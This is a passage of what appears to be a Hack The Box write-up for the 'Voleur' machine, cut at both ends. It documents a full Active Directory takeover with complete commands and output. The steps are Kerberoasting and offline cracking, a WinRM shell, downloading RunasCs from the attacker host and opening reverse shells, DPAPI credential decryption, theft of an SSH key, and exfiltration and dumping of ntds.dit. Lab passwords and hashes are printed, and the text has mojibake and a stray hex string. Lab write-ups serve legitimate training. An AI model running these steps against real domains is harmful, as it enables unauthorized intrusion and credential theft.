eb8464d73b6fdcbce1107f2cc523fa866107e083e28cddd42f38775308190c625e77fa83a437c0ed9fab68586ab66d37816cb7a7b38532f868be88e8eb5e46241db403de30ed9bb96 [VERBOSE] SPN removed successfully for (svc_winrm) The targeted Kerberoasting attack leveraged the WriteSPN permission to set arbitrary Service Principal Names on target accounts, then requested Kerberos service tickets for these accounts. This technique allows attackers to obtain encrypted ticket-granting service tickets that can be cracked offline to recover plaintext passwords.\nHashes Retrieved:\nlacey.miller:¬†krb5tgs23‚àólacey.miller‚Ä¶\nkrb5tgs\n‚àólacey.miller\nsvc_winrm:¬†krb5tgs23‚àósvcwinrm‚Ä¶\nkrb5tgs\n‚àósvcwinrm\nThe successful extraction of Kerberos ticket hashes for both lacey.miller and svc_winrm provided offline cracking targets. These Type 23 tickets use RC4 encryption, which is more vulnerable to cracking than newer encryption methods like AES.\n3.4 Hash Cracking\n1 2 3 4 5 6 7 8 9 10 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/HTB_Challenges/Machines/Season8/Voleur] ‚îî‚îÄ# john --wordlist=/home/hexhunter404/Downloads/rockyou.txt svc_winrm_hash.txt --format=krb5tgs Using default input encoding: UTF-8 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status AFireInsidedeOzarctica980219afi (?) 1g 0:00:00:08 DONE (2025-07-05 23:48) 0.1117g/s 1281Kp/s 1281Kc/s 1281KC/s AHAMDAKMAL..AFIROCKS! Use the \"--show\" option to display all of the cracked passwords reliably Session completed. Password Found:¬†AFireInsidedeOzarctica980219afi\nThe recovered password ‚ÄúAFireInsidedeOzarctica980219afi‚Äù appeared to be a combination of song lyrics or band name with additional characters, representing a common pattern where users create passwords they consider complex but are still vulnerable to wordlist attacks.\n3.5 WinRM Access\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404] ‚îî‚îÄ# ntpdate voleur.htb \u0026\u0026 impacket-getTGT voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi 2025-07-06 06:45:25.382677 (+0200) +28799.807445 +/- 0.013519 voleur.htb 10.129.196.199 s1 no-leap CLOCK: time stepped by 28799.807445 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in svc_winrm.ccache ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404] ‚îî‚îÄ# ntpdate voleur.htb \u0026\u0026 evil-winrm -i DC.voleur.htb -r VOLEUR.HTB 2025-07-06 06:46:56.688599 (+0200) +28803.921600 +/- 0.013948 voleur.htb 10.129.196.199 s1 no-leap CLOCK: time stepped by 28803.921600 Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_winrm\\Documents\u003e cd .. *Evil-WinRM* PS C:\\Users\\svc_winrm\u003e cd Desktop *Evil-WinRM* PS C:\\Users\\svc_winrm\\Desktop\u003e dir Directory: C:\\Users\\svc_winrm\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 1/29/2025 7:07 AM 2312 Microsoft Edge.lnk -ar--- 7/5/2025 8:38 PM 34 user.txt *Evil-WinRM* PS C:\\Users\\svc_winrm\\Desktop\u003e type user.txt 9ead16ec422a36bbec3e8eb539ea2d77 The successful WinRM connection established interactive PowerShell access to the domain controller. WinRM access provides significant capabilities for system administration and reconnaissance, as it allows execution of PowerShell commands with the privileges of the authenticated user.\nUser Flag Retrieved:¬†9ead16ec422a36bbec3e8eb539ea2d77\nPhase 4: DPAPI Exploitation I started looking around and found that there is a folder beloging to todd.wolfe in C:\\Users but inaccessible with svc_winrm as well as the share C:\\IT\nI tried to see the deleted users but didn‚Äôt have the required privileges with svc_winrm\n4.1 Custom Runas Tool\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 *Evil-WinRM* PS C:\\Users\u003e dir Directory: C:\\Users Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 6/5/2025 3:30 PM Administrator d----- 1/29/2025 7:11 AM jeremy.combs d-r--- 1/28/2025 12:35 PM Public d----- 1/30/2025 3:39 AM svc_backup d----- 1/29/2025 4:47 AM svc_ldap d----- 1/29/2025 7:07 AM svc_winrm d----- 1/29/2025 4:53 AM todd.wolfe *Evil-WinRM* PS C:\\Users\u003e cd todd.wolfe *Evil-WinRM* PS C:\\Users\\todd.wolfe\u003e dir Access to the path 'C:\\Users\\todd.wolfe' is denied. At line:1 char:1 + dir + ~~~ + CategoryInfo : PermissionDenied: (C:\\Users\\todd.wolfe:String) [Get-ChildItem], UnauthorizedAccessException + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand *Evil-WinRM* PS C:\\Users\\todd.wolfe\u003e cd .. *Evil-WinRM* PS C:\\Users\u003e cd svc_backup *Evil-WinRM* PS C:\\Users\\svc_backup\u003e dir Access to the path 'C:\\Users\\svc_backup' is denied. At line:1 char:1 + dir + ~~~ + CategoryInfo : PermissionDenied: (C:\\Users\\svc_backup:String) [Get-ChildItem], UnauthorizedAccessException + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand *Evil-WinRM* PS C:\\Users\\svc_backup\u003e cd .. *Evil-WinRM* PS C:\\Users\u003e cd jeremy_combs Cannot find path 'C:\\Users\\jeremy_combs' because it does not exist. At line:1 char:1 + cd jeremy_combs + ~~~~~~~~~~~~~~~ + CategoryInfo : ObjectNotFound: (C:\\Users\\jeremy_combs:String) [Set-Location], ItemNotFoundException + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand *Evil-WinRM* PS C:\\Users\\svc_winrm\\Documents\u003e Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $true -and ObjectClass -eq \"user\"' *Evil-WinRM* PS C:\\Users\\svc_winrm\\Documents\u003e Invoke-WebRequest -Uri \"http://10.10.14.173:8081/RunasCs.exe\" -OutFile \"runas.exe\" *Evil-WinRM* PS C:\\Users\\svc_winrm\\Documents\u003e runas.exe svc_ldap 'M1XyC9pW7qT5Vn' \"cmd.exe\" -r 10.10.14.173:8084 The discovery of a custom runas executable in the svc_winrm Documents folder suggested administrative tools or scripts left by system administrators. This tool provided the capability to execute commands as the svc_ldap user, effectively allowing impersonation and access to resources that svc_ldap could access.\n4.2 Deleted User Discovery (cf. https://activedirectorypro.com/restore-deleted-active-directory-user/)\nWith our netcat listening on port 8084\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# nc -lvnp 8084 Listening on 0.0.0.0 8084 Connection received on 10.129.196.199 59702 Microsoft Windows [Version 10.0.20348.3807] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami whoami voleur\\svc_ldap C:\\Windows\\system32\u003epowershell powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32\u003e Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $true -and ObjectClass -eq \"user\"' Get-ADObject -IncludeDeletedObjects -Filter 'IsDeleted -eq $true -and ObjectClass -eq \"user\"' Deleted : True DistinguishedName : CN=Todd Wolfe\\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb Name : Todd Wolfe DEL:1c6b1deb-c372-4cbb-87b1-15031de169db ObjectClass : user ObjectGUID : 1c6b1deb-c372-4cbb-87b1-15031de169db PS C:\\Windows\\system32\u003e Restore-ADObject -Identity \"CN=Todd Wolfe\\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb\" Restore-ADObject -Identity \"CN=Todd Wolfe\\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb\" PS C:\\Windows\\system32\u003e PS C:\\Windows\\system32\u003e net user /domain net user /domain User accounts for \\\\DC ------------------------------------------------------------------------------- Administrator krbtgt svc_ldap todd.wolfe The command completed successfully. The PowerShell query for deleted Active Directory objects revealed the presence of Todd Wolfe‚Äôs deleted account. Deleted accounts often retain valuable data and credentials, as administrators may not properly clean up associated files and profiles when accounts are removed.\nFound:¬†Todd Wolfe (deleted user)\nThe account of Todd Wolfe was successfully restrored. Todd Wolfe is member of Second-Line Support\nOnce restored, we run runas.exe one more time to get access as todd.wolfe\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ‚îå‚îÄ‚îÄ(hexhunter404„âøkali)-[~/Downloads] ‚îî‚îÄ$ nc -lvnp 8092 Listening on 0.0.0.0 8092 Connection received on 10.129.196.199 61323 Microsoft Windows [Version 10.0.20348.3807] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami whoami voleur\\todd.wolfe C:\\Windows\\system32\u003epowershell powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Nothing was really interesting found inside C:\\Users\\todd.wolfe\nNext step is to explore C:\\IT\\Second-Line Support now that we have access to the folder.\n4.3 Archived Profile Discovery\n1 2 C:\\Windows\\system32\u003e cd \"C:\\IT\\Second-Line Support\\Archived Users\" C:\\Windows\\system32\u003e Get-ChildItem -Recurse -Force -Hidden The exploration of archived user profiles revealed that the organization maintained copies of user data even after account deletion. This practice, while potentially useful for data recovery, creates significant security risks as it preserves sensitive information including cached credentials and DPAPI-protected data.\nAn important hidden folder discovered was (S-1-5-21-3927696377-1337352550-2781715495-1110 being the sid of todd.wolfe):\n1 \"Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3927696377-1337352550-2781715495-1110\" 4.4 DPAPI Files Extraction\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# ntpdate voleur.htb \u0026\u0026 impacket-smbclient -k 'voleur.htb/todd.wolfe@dc.voleur.htb' -no-pass 2025-07-06 22:18:36.728139 (+0200) +28799.988984 +/- 0.009491 voleur.htb 10.129.196.199 s1 no-leap CLOCK: time stepped by 28799.988984 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies Type help for list of commands # shares ADMIN$ C$ Finance HR IPC$ IT NETLOGON SYSVOL # use IT # cd Second-Line Support # cd Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-3927696377-1337352550-2781715495-1110 # ls drw-rw-rw- 0 Wed Jan 29 16:13:09 2025 . drw-rw-rw- 0 Wed Jan 29 16:13:09 2025 .. -rw-rw-rw- 740 Wed Jan 29 14:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88 -rw-rw-rw- 900 Wed Jan 29 13:53:08 2025 BK-VOLEUR -rw-rw-rw- 24 Wed Jan 29 13:53:08 2025 Preferred # get 08949382-134f-4c63-b93c-ce52efc0aa88 # get BK-VOLEUR # get Preferred # cd Second-Line Support\\Archived Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Credentials # ls drw-rw-rw- 0 Wed Jan 29 16:13:09 2025 . drw-rw-rw- 0 Wed Jan 29 16:13:09 2025 .. -rw-rw-rw- 398 Wed Jan 29 14:13:50 2025 772275FAD58525253490A9B0039791D3 # get 772275FAD58525253490A9B0039791D3 # exit The extraction of DPAPI (Data Protection API) files represented a sophisticated attack vector. DPAPI is Windows‚Äô mechanism for protecting sensitive data like saved passwords and certificates. The files extracted included the master key file, backup key, and preferred key, which together could decrypt stored credentials.\n4.5 DPAPI Decryption\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password NightT1meP1dg3on14 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [MASTERKEYFILE] Version : 2 (2) Guid : 08949382-134f-4c63-b93c-ce52efc0aa88 Flags : 0 (0) Policy : 0 (0) MasterKeyLen: 00000088 (136) BackupKeyLen: 00000068 (104) CredHistLen : 00000000 (0) DomainKeyLen: 00000174 (372) Decrypted key with User Key (MD4 protected) Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 The DPAPI master key decryption process required the user‚Äôs password (NightT1meP1dg3on14) and Security Identifier (SID).\nMaster Key:¬†0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83\n4.6 Credential Extraction\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [CREDENTIAL] LastWritten : 2025-01-29 12:55:19+00:00 Flags : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH) Persist : 0x00000003 (CRED_PERSIST_ENTERPRISE) Type : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD) Target : Domain:target=Jezzas_Account Description : Unknown : Username : jeremy.combs Unknown : qT3V9pLXyN7W4m The credential extraction phase utilized the decrypted master key to recover stored Windows credentials. This attack vector highlights the risk of Windows‚Äô credential caching mechanisms, which are designed for user convenience but can be exploited by attackers with appropriate access.\nCredentials Discovered:\nUsername:¬†jeremy.combs Password:¬†qT3V9pLXyN7W4m Target:¬†Domain:target=Jezzas_Account The recovered credentials for jeremy.combs provided access to a higher-privileged user account, likely with access to additional resources and systems within the domain.\nPhase 5: WSL/SSH Access 5.1 Third-Line Support Access\nThe escalation to jeremy.combs credentials provided access to the Third-Line Support folder, representing the highest tier of technical support within the organization. This folder contained sensitive administrative tools and documentation, including SSH private keys for system access.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # Get TGT for jeremy.combs impacket-getTGT voleur.htb/jeremy.combs:qT3V9pLXyN7W4m export KRB5CCNAME=/home/hexhunter404/Downloads/jeremy.combs.ccache ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# ntpdate voleur.htb \u0026\u0026 impacket-smbclient -k 'voleur.htb/jeremy.combs@dc.voleur.htb' -no-pass 2025-07-06 22:37:50.849882 (+0200) +28799.951925 +/- 0.012317 voleur.htb 10.129.196.199 s1 no-leap CLOCK: time stepped by 28799.951925 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies Type help for list of commands # use IT # cd Third-Line Support # ls drw-rw-rw- 0 Thu Jan 30 17:11:29 2025 . drw-rw-rw- 0 Wed Jan 29 10:10:01 2025 .. -rw-rw-rw- 2602 Thu Jan 30 17:11:29 2025 id_rsa -rw-rw-rw- 186 Thu Jan 30 17:07:35 2025 Note.txt.txt # get Note.txt.txt # get id_rsa # exit ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# cat Note.txt.txt Jeremy, I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux. Please see what you can set up. Thanks, Admin But there‚Äôs still an interesting folder Backups that even jeremy.combs cannot access\n1 2 3 4 5 6 7 8 *Evil-WinRM* PS C:\\IT\\Third-Line Support\u003e cd Backups *Evil-WinRM* PS C:\\IT\\Third-Line Support\\Backups\u003e dir Access to the path 'C:\\IT\\Third-Line Support\\Backups' is denied. At line:1 char:1 + dir + ~~~ + CategoryInfo : PermissionDenied: (C:\\IT\\Third-Line Support\\Backups:String) [Get-ChildItem], UnauthorizedAccessException + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand 5.2 SSH Key Analysis\n1 2 3 4 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# ssh-keygen -l -f id_rsa 3072 SHA256:+SJo12eqmKss6G70Hv3/wPrD2rXK9QY7fg8uUrxUeUw svc_backup@DC (RSA) The SSH key analysis revealed that the private key belonged to the svc_backup account on the domain controller. This discovery connected the unusual SSH service on port 2222 to the backup service account, suggesting a Linux subsystem used for backup operations.\nKey Identity:¬†svc_backup@DC (RSA)\n5.3 WSL Access\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# ssh -i id_rsa -p 2222 svc_backup@10.129.196.199 Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Jul 6 13:41:33 PDT 2025 System load: 0.52 Processes: 9 Usage of /home: unknown Users logged in: 0 Memory usage: 49% IPv4 address for eth0: 10.129.196.199 Swap usage: 1% 363 updates can be installed immediately. 257 of these updates are security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1 * Starting OpenBSD Secure Shell server sshd [ OK ] svc_backup@DC:~$ cd /mnt/c/IT/Third-Line\\ Support/Backups svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd Active\\ Directory/ svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls -la total 24592 drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 03:49 . drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 08:11 .. -rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30 03:49 ntds.dit -rwxrwxrwx 1 svc_backup svc_backup 16384 Jan 30 03:49 ntds.jfm svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ file ntds.dit ntds.dit: Extensible storage engine DataBase, version 0x620, checksum 0x34ab375f, page size 8192, Windows version 10.0 svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ cd .. svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd registry/ svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls -la total 17952 drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 03:49 . drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30 08:11 .. -rwxrwxrwx 1 svc_backup svc_backup 32768 Jan 30 03:30 SECURITY -rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30 03:30 SYSTEM svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ file SECURITY SECURITY: MS Windows registry file, NT/2000 or above svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ file SYSTEM SYSTEM: MS Windows registry file, NT/2000 or above The successful SSH connection confirmed the presence of Windows Subsystem for Linux (WSL) on the domain controller. This configuration allowed Linux-based tools and scripts to run on the Windows system, providing additional administrative capabilities but also creating new attack vectors.\nWSL Environment:¬†Ubuntu 20.04 LTS on Windows\nThe WSL environment provided access to the Windows file system through the¬†/mnt/c/¬†mount point. The backup folder contained critical system files that would normally be inaccessible to standard users, representing a significant security exposure.\nCritical Backups Found:\nActive Directory/¬†(ntds.dit, ntds.jfm) registry/¬†(SYSTEM, SECURITY) The discovery of Active Directory database files (ntds.dit) and registry hives (SYSTEM, SECURITY) represented the most critical finding of the entire penetration test. These files contain all domain user password hashes and system secrets.\n6.2 File Transfer\n1 2 3 4 5 6 7 8 9 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# scp -P 2222 -i id_rsa svc_backup@10.129.196.199:\"/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit\" . ntds.dit 100% 24MB 2.5MB/s 00:09 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# scp -P 2222 -i id_rsa svc_backup@10.129.196.199:\"/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY\" . SECURITY 100% 32KB 189.5KB/s 00:00 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# scp -P 2222 -i id_rsa svc_backup@10.129.196.199:\"/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM\" . SYSTEM 100% 18MB 3.0MB/s 00:05 The file transfer operation utilized SCP (Secure Copy Protocol) to extract the critical backup files. The ability to access these files through the WSL environment bypassed normal Windows security controls and audit mechanisms.\n6.3 Domain Hash Extraction\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d [*] Dumping cached domain logon information (domain/username:hash) [*] Dumping LSA Secrets [*] $MACHINE.ACC $MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2 $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77 [*] DPAPI_SYSTEM dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436 dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3 [*] NL$KM 0000 06 6A DC 3B AE F7 34 91 73 0F 6C E0 55 FE A3 FF .j.;..4.s.l.U... 0010 30 31 90 0A E7 C6 12 01 08 5A D0 1E A5 BB D2 37 01.......Z.....7 0020 61 C3 FA 0D AF C9 94 4A 01 75 53 04 46 66 0A AC a......J.uS.Ff.. 0030 D8 99 1F D3 BE 53 0C CF 6E 2A 4E 74 F2 E9 F2 EB .....S..n*Nt.... NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40 [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c::: voleur.htb\\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16::: voleur.htb\\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8::: voleur.htb\\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3::: voleur.htb\\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307::: voleur.htb\\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573::: voleur.htb\\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410::: voleur.htb\\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c::: voleur.htb\\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421::: [*] Kerberos keys from ntds.dit Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc Administrator:des-cbc-md5:459d836b9edcd6b0 DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7 DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782 DC$:des-cbc-md5:64e05b6d1abff1c8 krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145 krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211 krbtgt:des-cbc-md5:34ae31d073f86d20 voleur.htb\\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74 voleur.htb\\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1 voleur.htb\\ryan.naylor:des-cbc-md5:4376f7917a197a5b voleur.htb\\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d voleur.htb\\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f voleur.htb\\marie.bryant:des-cbc-md5:cdf1492604d3a220 voleur.htb\\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9 voleur.htb\\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066 voleur.htb\\lacey.miller:des-cbc-md5:6eef922076ba7675 voleur.htb\\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910 voleur.htb\\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f voleur.htb\\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776 voleur.htb\\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f voleur.htb\\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd voleur.htb\\svc_backup:des-cbc-md5:7ab513f8ab7f765e voleur.htb\\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258 voleur.htb\\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395 voleur.htb\\svc_iis:des-cbc-md5:70ce25431c577f92 voleur.htb\\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0 voleur.htb\\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27 voleur.htb\\jeremy.combs:des-cbc-md5:192f702abff75257 voleur.htb\\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114 voleur.htb\\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831 voleur.htb\\svc_winrm:des-cbc-md5:32b61fb92a7010ab [*] Cleaning up... The secrets extraction phase utilized Impacket‚Äôs secretsdump tool to parse the Active Directory database and registry hives. This process extracted all domain user password hashes, including the Domain Administrator account, effectively providing complete domain compromise.\nAdministrator NT Hash : aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2\nPhase 6: Domain Admin 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 ‚îå‚îÄ‚îÄ(root„âøkali)-[/home/hexhunter404/Downloads] ‚îî‚îÄ# 